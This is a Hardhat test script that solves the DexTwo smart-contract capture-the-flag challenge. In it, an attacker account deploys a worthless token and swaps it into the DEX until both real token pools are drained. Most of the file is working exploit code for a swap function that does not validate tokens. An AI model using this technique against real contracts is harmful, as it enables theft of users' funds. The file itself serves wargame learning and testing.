const { ethers } = require("hardhat");
const { expect } = require("chai");

const CONTRACT_NAME = "DexTwo";

describe(CONTRACT_NAME, () => {
  let owner;
  let attacker;
  let contract;
  let token1;
  let token2;
  let tx;

  beforeEach(async () => {
    // get signers
    [owner, attacker] = await ethers.getSigners();

    // deploy DexTwo contract
    const factory = await ethers.getContractFactory(CONTRACT_NAME);
    contract = await factory.deploy();
    await contract.deployed();

    // deploy Token1
    const token1Factory = await ethers.getContractFactory("SwappableTokenTwo");
    token1 = await token1Factory.deploy(
      contract.address,
      "Token 1",
      "TKN1",
      110
    );
    await token1.deployed();

    // deploy Token2
    const token2Factory = await ethers.getContractFactory("SwappableTokenTwo");
    token2 = await token2Factory.deploy(
      contract.address,
      "Token 2",
      "TKN2",
      110
    );
    await token2.deployed();

    // set tokens in the DexTwo contract
    tx = await contract.setTokens(token1.address, token2.address);
    await tx.wait();

    // approve the contract to manage Token1
    tx = await token1["approve(address,address,uint256)"](
      owner.address,
      contract.address,
      100
    );
    await tx.wait();

    // approve the contract to manage Token2
    tx = await token2["approve(address,address,uint256)"](
      owner.address,
      contract.address,
      100
    );
    await tx.wait();

    // add liquidity to DexTwo contract for Token1
    tx = await contract.add_liquidity(token1.address, 100);
    await tx.wait();

    // add liquidity to DexTwo contract for Token2
    tx = await contract.add_liquidity(token2.address, 100);
    await tx.wait();

    // transfer some Token1 to the attacker
    tx = await token1.transfer(attacker.address, 10);
    await tx.wait();

    // transfer some Token2 to the attacker
    tx = await token2.transfer(attacker.address, 10);
    await tx.wait();

    // let the attacker control the contract
    contract = contract.connect(attacker);
  });

  it("Solves the challenge", async () => {
    // attacker approves the contract to manage their tokens
    tx = await contract.approve(contract.address, 100000);
    await tx.wait();

    // attacker deploys their own token
    const attackerTokenFactory = await ethers.getContractFactory(
      "SwappableTokenTwo"
    );
    const attackerToken = await attackerTokenFactory
      .connect(attacker)
      .deploy(contract.address, "Attack on Token", "AOT", 100000);
    await attackerToken.deployed();

    // attacker approves the contract to manage their own token
    tx = await attackerToken["approve(address,address,uint256)"](
      attacker.address,
      contract.address,
      100000
    );
    await tx.wait();

    // attacker transfers some of their own token to the contract
    tx = await attackerToken.transfer(contract.address, 1);
    await tx.wait();

    // attacker swaps their own token for Token1
    tx = await contract.swap(attackerToken.address, token1.address, 1);
    await tx.wait();

    // attacker transfers more of their own token to the contract
    tx = await attackerToken.transfer(contract.address, 8);
    await tx.wait();

    // attacker swaps their own token for Token2
    tx = await contract.swap(attackerToken.address, token2.address, 10);
    await tx.wait();

    // check if the contract has been drained of Token1
    expect(await token1.balanceOf(contract.address)).to.eq(0);

    // check if the contract has been drained of Token2
    expect(await token2.balanceOf(contract.address)).to.eq(0);
  });
});
